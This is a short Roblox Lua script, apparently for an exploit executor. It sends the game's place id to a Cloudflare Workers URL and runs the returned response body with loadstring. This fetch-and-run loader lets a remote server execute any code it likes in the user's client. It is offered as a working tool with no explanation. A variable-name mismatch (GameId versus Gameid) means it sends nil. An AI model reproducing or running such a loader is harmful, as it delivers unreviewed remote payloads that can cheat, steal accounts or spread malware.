local Players = game:GetService("Players")

_G.GameId = game.PlaceId
local v8 = "https://crimson-firefly-6874.nothingpanel00.workers.dev/"

task.wait(0.1)
print("url checked")
local response = request({
    Url = v8,
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = game:GetService("HttpService"):JSONEncode({
        id = _G.Gameid
    })
})
if response.StatusCode == 200 then
    local execute = loadstring(response.Body)
    if execute then
        execute()
    end
else
    warn(" failed . Status: " .. tostring(response.StatusCode))
end
